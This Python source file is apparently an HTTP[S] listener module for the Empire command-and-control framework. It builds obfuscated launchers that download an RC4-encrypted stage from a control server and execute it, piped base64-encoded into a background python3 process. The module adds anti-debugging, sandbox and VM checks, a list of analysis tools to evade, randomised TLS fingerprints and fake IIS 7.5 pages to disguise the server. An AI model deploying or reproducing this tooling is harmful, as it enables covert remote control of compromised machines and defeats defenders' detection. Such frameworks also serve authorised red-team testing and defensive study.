import base64
import copy
import logging
import os
import random
import ssl
import sys
import time
from builtins import str
from typing import List, Optional, Tuple

from flask import Flask, make_response, render_template, request, send_from_directory
from werkzeug.serving import WSGIRequestHandler

from empire.server.common import encryption, helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util, listener_util, log_util
from empire.server.utils.module_util import handle_validate_message
from empire.server.utils.python_listener_util import *

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class LauncherGen(object):
    def __init__(self, host: str, port: int, path: str,
                 ua: str, cookie: str, key: str, headers: [], proxies: [], funcs: [str]):
        self.funcs = funcs
        # sourcery skip: low-code-quality
        self.imports = '''
import os, sys, re, subprocess, urllib.request
'''

        self.static = '''
class Dnull:
    def write(self, msg):
        pass

def except_hook(**args):
    pass

sys.excepthook = except_hook
sys.stderr = Dnull()
sys.tracebacklimit = 0
'''
        self.funcs.append('''
def f(d, e):
    a, b, c = list(range(256)), 0, []
    for i in range(256):
        b = (b + a[i] + e[i % len(e)]) % 256
        a[i], a[b] = a[b], a[i]
    i = b = 0
    for char in d:
        i = (i + 1) % 256
        b = (b + a[i]) % 256
        a[i], a[b] = a[b], a[i]
        c.append(chr(char ^ a[(a[i] + a[b]) % 256]))
    return c
''')

        self.ssl_ignore = '''
import ssl
if hasattr(ssl, '_create_unverified_context'):
    ssl._create_default_https_context = ssl._create_unverified_context
        ''' if 'https' in host else ''

        if 'none' in proxies:
            self.request = f'''
r = urllib.request.Request('{host}{path}', headers={'User-Agent': '{ua}', 'Cookie': 'session={cookie}'})
            '''

            for h in headers:
                self.request += f'''
r.add_header("{h.split(":")[0]}","{h.split(":")[1]}")
                '''

            self.request += f'''
with urllib.request.urlopen(r) as response:
    g = response.read()
    h = f(g[4:], g[:4] + '{key}'.encode('UTF-8'))
    exec(''.join(h))'''
        else:
            if 'default' in proxies:
                self.request = '''
ph = urllib.request.ProxyHandler()'''
            else:
                self.request = '''
ph = urllib.request.ProxyHandler({'''
                from urllib.parse import urlparse
                for p in proxies:
                    parsed = urlparse(p)
                    proto = parsed.scheme
                    userpass = parsed.netloc.split('@')
                    if len(userpass) > 1:
                        user = userpass[0].split(':')[0]
                        pswd = userpass[0].split(':')[1] if ':' in userpass[0] else None
                        proxy_host = userpass[1].split(':')[0]
                        proxy_port = int(userpass[1].split(':')[1])
                        self.request += f'''
    '{proto}': '{proto}://{user}:{pswd}@{proxy_host}:{proxy_port}','''
                    else:
                        proxy_host = userpass[0].split(':')[0]
                        proxy_port = int(userpass[0].split(':')[1])
                        self.request += f'''
    '{proto}': '{proto}://{proxy_host}:{proxy_port}','''
                self.request += '''
})'''
            hs = [('User-Agent', ua), ('Cookie', f'session={cookie}')]
            hs.extend((h.split(":")[0], h.split(":")[1]) for h in headers)
            self.request += f'''
o = urllib.request.build_opener(ph)
o.addheaders = {hs}
request = urllib.request.Request('{host}{path}')'''
            self.request += f'''
with o.open(request) as response:
    g = response.read()
    h = f(g[4:], g[:4] + '{key}'.encode('UTF-8'))
    exec(''.join(h))'''

    def gen(self):
        random.shuffle(self.funcs)
        a = self.imports + self.static
        for f in self.funcs:
            a += f
        a += self.ssl_ignore + self.request
        return a


class Listener(object):
    def __init__(self, main_menu: MainMenu, params=None):
        if params is None:
            params = []
        self.info = {
            "Name": "HTTP[S] V2",
            "Authors": [
                {
                    "Name": "0xf0b05",
                    "Handle": "@none",
                    "Link": "https://nolink",
                }
            ],
            "Description": "Starts a http[s] listener that uses a GET/POST approach.",
            "Category": "client_server",
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_v2",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": f"http://{helpers.lhost()}",
            },
            "BindIP": {
                "Description": "The IP to bind to on the control server.",
                "Required": True,
                "Value": "0.0.0.0",
                "SuggestedValues": ["0.0.0.0"],
                "Strict": False,
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "",
                "SuggestedValues": ["8080", "8008"],
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "",
                "SuggestedValues": [
                    "2c103f2c4ed1e59c0b4e2e01821770fa",
                    "2c103f2c4ed1e59c0b4e2e01821770fb",
                ],
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 10,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reach-back interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 60,
            },
            "DefaultProfile": {
                "Description": "Default comm profile for the agent. Endpoints | User agent | Headers (key:value), "
                               "comma divided",
                "Required": True,
                "Value": "/v1/auth/token,/signin|Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101",
            },
            "CertPath": {
                "Description": "Certificate path for https listeners.",
                "Required": False,
                "Value": "",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (dd/MM/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "Headers": {
                "Description": "Headers for the control server.",
                "Required": True,
                "Value": "Server:Microsoft-IIS/7.5",
            },
            "Cookie": {
                "Description": "Custom Cookie Name",
                "Required": False,
                "Value": "",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxies divided by comma (default, none, or other). user:pass@proxy",
                "Required": False,
                "Value": "default",
            },
            "Obfuscation": {
                "Description": "Obfuscate launcher with random data.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
            },
            "CheckDebug": {
                "Description": "Anti-debug checks",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
            },
            "CheckSpecs": {
                "Description": "Check machine specs and try avoid VMS or sandboxes",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
            },
            "CheckProcess": {
                "Description": "Check process and avoid launcher execution. Checks for procs within the task list "
                               "with 'contains' function. ('none' or comma divided)",
                "Required": True,
                "Value": "df5serv,fiddler,frida,gdb,httpdebugger,ida,joebox,ksdumper,ollydbg,pestudio,prl_cc,"
                         "prl_tools,processhacker,qemu-ga,radare,regedit,taskmgr,vboxservice,vboxtray,vgauthservice,"
                         "vmacthlp,vmsrvc,vmtoolsd,vmusrvc,vmware,wireshark,x32dbg,x96dbg,xenservice,snitch",
            },
            "JA3_Evasion": {
                "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
                "Required": True,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
            },
        }

        # required:
        self.mainMenu = main_menu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.session_cookie = ""
        self.template_dir = f"{self.mainMenu.installPath}/data/listeners/templates/"

        # check if the current session cookie not empty and then generate random cookie
        if not self.session_cookie:
            self.options["Cookie"]["Value"] = listener_util.generate_cookie()

        self.instance_log = log

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """
        return open(f"{self.template_dir}/default.html", "r").read()

    def validate_options(self) -> Tuple[bool, Optional[str]]:
        """
        Validate all options for this listener.
        """
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # If we've selected an HTTPS listener without specifying CertPath, let us know.
        if (self.options["Host"]["Value"].startswith("https")
                and self.options["CertPath"]["Value"] == ""):
            return handle_validate_message("[!] HTTPS selected but no CertPath specified.")

        return True, None

    def generate_launcher(
            self,
            encode=True,
            obfuscate=False,
            obfuscation_command="",
            userAgent="default",
            proxy="default",
            proxyCreds="default",
            stagerRetries="0",
            language=None,
            safeChecks="",
            listenerName=None,
            bypasses: List[str] = None,
            build_arch='win'
    ):
        """
        Generate a launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses
        if not language:
            log.error(
                f"{listenerName}: listeners/http generate_launcher(): no language specified!"
            )
            return None

        active_listener = self
        # extract the set options for this instantiated listener
        listener_options = active_listener.options
        host = listener_options["Host"]["Value"]
        port = listener_options["Port"]["Value"]
        staging_key = listener_options["StagingKey"]["Value"]
        profile = listener_options["DefaultProfile"]["Value"]
        if not listener_options["Cookie"]["Value"]:
            listener_options["Cookie"]["Value"] = listener_util.generate_cookie()
        cookie = listener_options["Cookie"]["Value"]
        obfuscation = listener_options["Obfuscation"]["Value"]
        check_debug = listener_options["CheckDebug"]["Value"]
        check_specs = listener_options["CheckSpecs"]["Value"]
        check_process = listener_options["CheckProcess"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = random.choice(uris)
        custom_headers = profile.split("|")[2:]
        custom_headers = profile.split("|")[2:][0].split(',') if custom_headers else []
        proxies = proxy.split(',')
        if userAgent.lower() == "default":
            profile = listener_options["DefaultProfile"]["Value"]
            userAgent = profile.split("|")[1]

        if language in ["python", "ironpython"]:
            # Python
            # prebuild the request routing packet for the launcher
            b64_routing_packet = base64.b64encode(packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )).decode("UTF-8")

            additional_func = []
            if check_debug == 'True':
                additional_func.append(python_anti_debug_checks())
            if check_specs == 'True':
                additional_func.append(python_specs_checks(build_arch))
            if check_process and 'none' not in check_process:
                additional_func.append(python_proc_checks(build_arch, check_process.split(',')))

            gen = LauncherGen(host, port, stage0, userAgent, b64_routing_packet,
                              staging_key, custom_headers, proxies, additional_func).gen()

            # if obfuscate:
            #     launcherBase = self.mainMenu.obfuscationv2.obfuscate(
            #         launcherBase,
            #         obfuscation_command=obfuscation_command,
            #     )
            #     launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
            #         launcherBase
            #     )
            #
            if encode:
                encoded = base64.b64encode(
                    gen.encode("UTF-8")
                ).decode("UTF-8")
                if isinstance(encoded, bytes):
                    encoded = encoded.decode("UTF-8")
                launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{encoded}'));\" | python3 &"
                return launcher
            else:
                return gen

        else:
            self.instance_log.error(
                f"{listenerName}: listeners/http generate_launcher(): invalid language specification: only 'python' "
                f"is supported for this module."
            )

    def generate_stager(
            self,
            listenerOptions,
            encode=False,
            encrypt=True,
            obfuscate=False,
            obfuscation_command="",
            language=None,
    ):
        """
        Generate the stager code needed for communications with this listener.
        """
        if not language:
            log.error("listeners/http generate_stager(): no language specified!")
            return None

        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        host = listenerOptions["Host"]["Value"]
        customHeaders = profile.split("|")[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            # Patch in custom Headers
            remove = []
            if customHeaders:
                for key in customHeaders:
                    value = key.split(":")
                    if "cookie" in value[0].lower() and value[1]:
                        continue
                    remove += value
                headers = ",".join(remove)
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                )

            stagingKey = stagingKey.encode("UTF-8")
            stager = listener_util.remove_lines_comments(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager, obfuscation_command=obfuscation_command
                )
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            # base64 encode the stager and return it
            # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
            # if/else statements are irrelevant
            if encode:
                return helpers.enc_powershell(stager)
            elif encrypt:
                rc4_iv = os.urandom(4)
                return rc4_iv + encryption.rc4(
                    rc4_iv + stagingKey, stager.encode("UTF-8")
                )
            else:
                return stager

        elif language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if not encrypt:
                # otherwise return the standard stager
                return stager

            # return an encrypted version of the stager ("normal" staging)
            rc4_iv = os.urandom(4)
            return rc4_iv + encryption.rc4(rc4_iv + stagingKey.encode("UTF-8"), stager.encode("UTF-8"))
        else:
            log.error(
                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are "
                "currently supported for this module."
            )

    def generate_agent(
            self,
            listenerOptions,
            language=None,
            obfuscate=False,
            obfuscation_command="",
            version="",
    ):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            log.error("listeners/http generate_agent(): no language specified!")
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "python":
            if version == "ironpython":
                f = open(f"{self.mainMenu.installPath}/data/agent/ironpython_agent.py")
            else:
                f = open(f"{self.mainMenu.installPath}/data/agent/agent.py")
            code = f.read()
            f.close()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay = 60", f"delay = {delay}")
            code = code.replace("jitter = 0.0", f"jitter = {jitter}")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; '
                'Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{profile}"',
            )
            code = code.replace("lostLimit = 60", f"lostLimit = {lostLimit}")
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                f'defaultResponse = base64.b64decode("{b64DefaultResponse.decode("UTF-8")}")',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace(
                    'killDate = "REPLACE_KILLDATE"', f'killDate = "{killDate}"'
                )
            if workingHours != "":
                code = code.replace(
                    'workingHours = "REPLACE_WORKINGHOURS"',
                    f'workingHours = "{killDate}"',
                )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)

            return code
        elif language == "csharp":
            return ""
        else:
            log.error(
                "listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', "
                "& 'csharp' are currently supported for this module."
            )

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        host = listenerOptions["Host"]["Value"]

        if language:
            if language.lower() == "powershell":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]

                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/comms.ps1")

                template_options = {
                    "session_cookie": self.session_cookie,
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            elif language.lower() == "python":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]
                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/comms.py")

                template_options = {
                    "session_cookie": self.session_cookie,
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            else:
                log.error(
                    "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' "
                    "are currently supported for this module."
                )
        else:
            log.error("listeners/http generate_comms(): no language specified!")

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """
        # TODO VR Since name is editable, we should probably use the listener's id here.
        #  But its not available until we do some refactoring. For now, we'll just use the name.
        self.instance_log = log_util.get_listener_logger(
            LOG_NAME_PREFIX, self.options["Name"]["Value"]
        )

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        werkzeug_log = logging.getLogger("werkzeug")
        werkzeug_log.setLevel(logging.ERROR)

        bindIP = listenerOptions["BindIP"]["Value"]
        port = listenerOptions["Port"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        userAgent = listenerOptions["UserAgent"]["Value"]
        listenerName = listenerOptions["Name"]["Value"]
        proxy = listenerOptions["Proxy"]["Value"]

        if "pytest" in sys.modules:
            # Let's not start the server if we're running tests.
            while True:
                time.sleep(1)

        app = Flask(__name__, template_folder=self.template_dir)
        self.app = app

        # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
        WSGIRequestHandler.protocol_version = "HTTP/1.1"

        @app.route("/download/<stager>/")
        @app.route("/download/<stager>/<hop>")
        def send_stager(stager, hop=None):
            with SessionLocal.begin() as db:
                if stager == "ironpython":
                    obfuscation_config = (
                        self.mainMenu.obfuscationv2.get_obfuscation_config(db, "csharp")
                    )
                else:
                    obfuscation_config = (
                        self.mainMenu.obfuscationv2.get_obfuscation_config(db, stager)
                    )
                obfuscation = obfuscation_config.enabled
                obfuscation_command = obfuscation_config.command

            if "powershell" == stager:
                launcher = self.mainMenu.stagers.generate_launcher(
                    listener_name=hop or listenerName,
                    language="powershell",
                    encode=False,
                    obfuscate=obfuscation,
                    obfuscation_command=obfuscation_command,
                    userAgent=userAgent,
                    proxy=proxy,
                    proxy_creds="",
                )
                return launcher

            elif "python" == stager:
                launcher = self.mainMenu.stagers.generate_launcher(
                    listener_name=hop or listenerName,
                    language="python",
                    encode=False,
                    obfuscate=obfuscation,
                    obfuscation_command=obfuscation_command,
                    userAgent=userAgent,
                    proxy=proxy,
                    proxy_creds="",
                )
                return launcher

            elif "ironpython" == stager:
                if hop:
                    options = copy.deepcopy(self.options)
                    options["Listener"] = {}
                    options["Listener"]["Value"] = hop
                    options["Language"] = {}
                    options["Language"]["Value"] = stager
                    launcher = self.mainMenu.stagers.generate_stageless(options)
                else:
                    launcher = self.mainMenu.stagers.generate_launcher(
                        listener_name=hop or listenerName,
                        language="python",
                        encode=False,
                        obfuscate=obfuscation,
                        userAgent=userAgent,
                        proxy=proxy,
                        proxy_creds="",
                    )

                directory = self.mainMenu.stagers.generate_python_exe(
                    launcher, dot_net_version="net40", obfuscate=obfuscation
                )
                with open(directory, "rb") as f:
                    code = f.read()
                return code

            elif "csharp" == stager:
                filename = self.mainMenu.stagers.generate_launcher(
                    listener_name=hop or listenerName,
                    language="csharp",
                    encode=False,
                    obfuscate=obfuscation,
                    userAgent=userAgent,
                    proxy=proxy,
                    proxy_creds="",
                )
                directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/net35/{filename}.exe"
                with open(directory, "rb") as f:
                    code = f.read()
                return code
            else:
                return make_response(self.default_response(), 404)

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                listenerName = self.options["Name"]["Value"]
                message = (f"{listenerName}: {request.remote_addr} on the blacklist/not on the whitelist requested "
                           "resource")
                self.instance_log.info(message)
                return make_response(self.default_response(), 404)

        @app.after_request
        def change_header(response):
            """
            Modify the headers response server.
            """
            headers = listenerOptions["Headers"]["Value"]
            for key in headers.split("|"):
                if key.split(":")[0].lower() == "server":
                    WSGIRequestHandler.server_version = key.split(":")[1]
                    WSGIRequestHandler.sys_version = ""
                else:
                    value = key.split(":")
                    response.headers[value[0]] = value[1]
            return response

        @app.after_request
        def add_proxy_headers(response):
            """
            Add HTTP headers to avoid proxy caching.
            """
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            return response

        @app.errorhandler(405)
        def handle_405(e):
            """
            Returns IIS 7.5 405 page for every Flask 405 error.
            """
            return render_template("method_not_allowed.html"), 405

        @app.route("/")
        @app.route("/iisstart.htm")
        def serve_index():
            """
            Return default server web page if user navigates to index.
            """
            return render_template("index.html"), 200

        @app.route("/<path:request_uri>", methods=["GET"])
        def handle_get(request_uri):
            """
            Handle an agent GET request.
            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """
            if request_uri.lower() == "welcome.png":
                # Serves image loaded by index page.
                #
                # Thanks to making it case-insensitive it works the same way as in
                # an actual IIS server
                static_dir = self.mainMenu.installPath + "/data/misc/"
                return send_from_directory(static_dir, "welcome.png")

            clientIP = request.remote_addr

            listenerName = self.options["Name"]["Value"]
            message = f"{listenerName}: GET request for {request.host}/{request_uri} from {clientIP}"
            self.instance_log.info(message)

            routingPacket = None
            cookie = request.headers.get("Cookie")

            if cookie and cookie != "":
                try:
                    # see if we can extract the 'routing packet' from the specified cookie location
                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                    if self.session_cookie in cookie:
                        listenerName = self.options["Name"]["Value"]
                        message = f"{listenerName}: GET cookie value from {clientIP} : {cookie}"
                        self.instance_log.info(message)
                        cookieParts = cookie.split(";")
                        for part in cookieParts:
                            if part.startswith(self.session_cookie):
                                base64RoutingPacket = part[part.find("=") + 1:]
                                # decode the routing packet base64 value in the cookie
                                routingPacket = base64.b64decode(base64RoutingPacket)
                except Exception:
                    routingPacket = None
                    pass

            if routingPacket:
                # parse the routing packet and process the results

                dataResults = self.mainMenu.agents.handle_agent_data(
                    stagingKey, routingPacket, listenerOptions, clientIP
                )
                if dataResults and len(dataResults) > 0:
                    for language, results in dataResults:
                        if results:
                            if isinstance(results, str):
                                results = results.encode("UTF-8")
                            if results == b"STAGE0":
                                # handle_agent_data() signals that the listener should return the stager.ps1 code
                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                message = f"{listenerName}: Sending {language} stager (stage 1) to {clientIP}"
                                self.instance_log.info(message)
                                log.info(message)

                                # Check for hop listener
                                hopListenerName = request.headers.get("Hop-Name")
                                hopListener = self.mainMenu.listenersv2.get_active_listener_by_name(
                                    hopListenerName
                                )

                                with SessionLocal() as db:
                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                                        db, language
                                    )

                                    if hopListener:
                                        stage = hopListener.generate_stager(
                                            language=language,
                                            listenerOptions=hopListener.options,
                                            obfuscate=False
                                            if not obf_config
                                            else obf_config.enabled,
                                            obfuscation_command=""
                                            if not obf_config
                                            else obf_config.command,
                                        )

                                    else:
                                        stage = self.generate_stager(
                                            language=language,
                                            listenerOptions=listenerOptions,
                                            obfuscate=False
                                            if not obf_config
                                            else obf_config.enabled,
                                            obfuscation_command=""
                                            if not obf_config
                                            else obf_config.command,
                                        )
                                return make_response(stage, 200)

                            elif results.startswith(b"ERROR:"):
                                listenerName = self.options["Name"]["Value"]
                                message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
                                self.instance_log.error(message)

                                if b"not in cache" in results:
                                    # signal the client to restage
                                    log.info(
                                        f"{listenerName}: Orphaned agent from {clientIP}, signaling restaging"
                                    )
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 200)

                            else:
                                # actual taskings
                                listenerName = self.options["Name"]["Value"]
                                message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
                                self.instance_log.info(message)
                                return make_response(results, 200)
                        else:
                            message = f"{listenerName}: Results are None for {request_uri} from {clientIP}"
                            self.instance_log.debug(message)
                            return make_response(self.default_response(), 200)
                else:
                    return make_response(self.default_response(), 200)

            else:
                listenerName = self.options["Name"]["Value"]
                message = f"{listenerName}: {request_uri} requested by {clientIP} with no routing packet."
                self.instance_log.error(message)
                return make_response(self.default_response(), 404)

        @app.route("/<path:request_uri>", methods=["POST"])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """
            stagingKey = listenerOptions["StagingKey"]["Value"]
            clientIP = request.remote_addr
            requestData = request.get_data()

            listenerName = self.options["Name"]["Value"]
            message = f"{listenerName}: POST request data length from {clientIP} : {len(requestData)}"
            self.instance_log.info(message)

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            dataResults = self.mainMenu.agents.handle_agent_data(
                stagingKey, requestData, listenerOptions, clientIP
            )
            if dataResults and len(dataResults) > 0:
                for language, results in dataResults:
                    if isinstance(results, str):
                        results = results.encode("UTF-8")

                    if results:
                        if results.startswith(b"STAGE2"):
                            # TODO: document the exact results structure returned
                            if ":" in clientIP:
                                clientIP = "[" + str(clientIP) + "]"
                            sessionID = results.split(b" ")[1].strip().decode("UTF-8")
                            sessionKey = self.mainMenu.agents.agents[sessionID][
                                "sessionKey"
                            ]

                            listenerName = self.options["Name"]["Value"]
                            message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
                            self.instance_log.info(message)
                            log.info(message)

                            hopListenerName = request.headers.get("Hop-Name")

                            # Check for hop listener
                            hopListener = data_util.get_listener_options(
                                hopListenerName
                            )
                            tempListenerOptions = copy.deepcopy(listenerOptions)
                            if hopListener is not None:
                                tempListenerOptions["Host"][
                                    "Value"
                                ] = hopListener.options["Host"]["Value"]
                                with SessionLocal.begin() as db:
                                    db_agent = self.mainMenu.agentsv2.get_by_id(
                                        db, sessionID
                                    )
                                    db_agent.listener = hopListenerName
                            else:
                                tempListenerOptions = listenerOptions

                            session_info = (
                                SessionLocal()
                                .query(models.Agent)
                                .filter(models.Agent.session_id == sessionID)
                                .first()
                            )
                            if session_info.language == "ironpython":
                                version = "ironpython"
                            else:
                                version = ""

                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                            with SessionLocal() as db:
                                obf_config = (
                                    self.mainMenu.obfuscationv2.get_obfuscation_config(
                                        db, language
                                    )
                                )
                                agentCode = self.generate_agent(
                                    language=language,
                                    listenerOptions=tempListenerOptions,
                                    obfuscate=False
                                    if not obf_config
                                    else obf_config.enabled,
                                    obfuscation_command=""
                                    if not obf_config
                                    else obf_config.command,
                                    version=version,
                                )

                                if language.lower() in ["python", "ironpython"]:
                                    sessionKey = bytes.fromhex(sessionKey)

                                encryptedAgent = encryption.aes_encrypt_then_hmac(
                                    sessionKey, agentCode
                                )
                                # TODO: wrap ^ in a routing packet?

                                return make_response(encryptedAgent, 200)

                        elif results[:10].lower().startswith(b"error") or results[
                                                                          :10
                                                                          ].lower().startswith(b"exception"):
                            listenerName = self.options["Name"]["Value"]
                            message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
                            self.instance_log.error(message)
                            return make_response(self.default_response(), 404)
                        elif results.startswith(b"VALID"):
                            listenerName = self.options["Name"]["Value"]
                            message = (
                                f"{listenerName}: Valid results returned by {clientIP}"
                            )
                            self.instance_log.info(message)
                            return make_response(self.default_response(), 200)
                        else:
                            return make_response(results, 200)
                    else:
                        return make_response(self.default_response(), 404)
            else:
                return make_response(self.default_response(), 404)

        try:
            certPath = listenerOptions["CertPath"]["Value"]
            host = listenerOptions["Host"]["Value"]
            ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]

            if certPath.strip() != "" and host.startswith("https"):
                certPath = os.path.abspath(certPath)

                # support any version of tls
                pyversion = sys.version_info
                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
                    proto = ssl.PROTOCOL_TLS
                elif pyversion[0] >= 3:
                    proto = ssl.PROTOCOL_TLS
                else:
                    proto = ssl.PROTOCOL_SSLv23

                context = ssl.SSLContext(proto)
                context.load_cert_chain(f"{certPath}/empire-chain.pem", f"{certPath}/empire-priv.key")

                if ja3_evasion:
                    context.set_ciphers(listener_util.generate_random_cipher())

                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            listenerName = self.options["Name"]["Value"]
            log.error(
                f"{listenerName}: Listener startup on port {port} failed: {e}",
                exc_info=True,
            )

    def start(self, name=""):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if not name or name == "":
            name = listenerOptions["Name"]["Value"]
        self.threads[name] = helpers.KThread(
            target=self.start_server, args=(listenerOptions,)
        )
        self.threads[name].start()
        time.sleep(1)
        # returns True if the listener successfully started, false otherwise
        return self.threads[name].is_alive()

    def shutdown(self, name=""):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """
